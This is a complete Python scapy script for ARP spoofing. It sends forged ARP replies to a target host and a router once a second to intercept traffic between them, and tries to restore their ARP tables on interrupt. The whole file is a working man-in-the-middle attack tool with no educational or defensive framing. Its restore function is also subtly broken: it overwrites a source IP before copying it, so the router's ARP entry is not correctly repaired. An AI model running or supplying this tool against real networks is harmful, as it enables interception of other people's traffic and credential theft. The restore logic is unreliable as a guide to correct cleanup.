import scapy.all as scapy
import argparse
import time
import sys

def get_ip():
    parser=argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Specify the target IP")
    parser.add_argument("-s", "--spoof", dest="spoof", help="Specify the router IP")
    arguments=parser.parse_args()
    return (arguments.target, arguments.spoof)


def get_mac(target_ip):
    arp_request=scapy.ARP(pdst=target_ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast=broadcast/arp_request
    answered_list=scapy.srp(arp_request_broadcast, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    packet_to_target = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    packet_to_router = scapy.ARP(op=2, pdst=spoof_ip, hwdst=get_mac(spoof_ip), psrc=target_ip)
    return packet_to_target, packet_to_router

def restore(target_packet,router_packet):

    target_packet.hwsrc = get_mac(target_packet.psrc)
    router_packet.hwsrc = get_mac(router_packet.psrc)

    target_packet.psrc=router_packet.pdst
    router_packet.psrc=target_packet.psrc

    scapy.send(target_packet, verbose=False)
    scapy.send(router_packet, verbose=False)


def poisonARP(target_packet, router_packet):
    counter = 0
    try:
        while True:
            counter += 1
            scapy.send(target_packet, verbose=False)
            scapy.send(router_packet, verbose=False)
            print("[+]Sent [" + str(counter) + "] packet", end="\r"),
            sys.stdout.flush()
            time.sleep(1)
    except KeyboardInterrupt:
        print("Spoofer terminated")
        restore(target_packet, router_packet)


(target_ip, spoof_ip) = get_ip()
target_packet , router_packet= spoof(target_ip, spoof_ip)
poisonARP(target_packet,router_packet)
